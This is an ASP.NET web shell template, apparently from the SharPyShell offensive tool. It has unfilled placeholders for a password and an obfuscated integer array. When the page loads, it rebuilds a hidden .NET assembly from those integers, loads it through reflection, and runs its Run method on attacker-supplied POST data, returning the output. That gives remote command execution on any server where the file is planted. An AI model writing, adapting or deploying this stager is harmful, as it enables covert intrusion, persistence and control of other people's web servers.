<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Reflection" %>

<script Language="c#" runat="server">

void Page_Load(object sender, EventArgs e)
{
	string p = "{{SharPyShell_Placeholder_pwd}}";
	string r = Request.Form["data"];
	ulong[] int_arr = {{SharPyShell_Placeholder_ulong_arr}};
	ulong[] int_arr_r = {{SharPyShell_Placeholder_remainders}};
	for (int i=0; i<int_arr.Length; i++) int_arr[i] = (int_arr[i] * {{SharPyShell_Placeholder_divisor}} + int_arr_r[i]);
	byte[] a = new byte[int_arr.Length * 8];
	System.Buffer.BlockCopy(int_arr, 0, a, 0, a.Length);
	Assembly aS = Assembly.Load(a);
	object o = aS.CreateInstance("SharPy");
	MethodInfo mi = o.GetType().GetMethod("Run");
	object[] iN = new object[] {r, p};
	object oU = mi.Invoke(o, iN);
	Response.Write(oU);
}

</script>

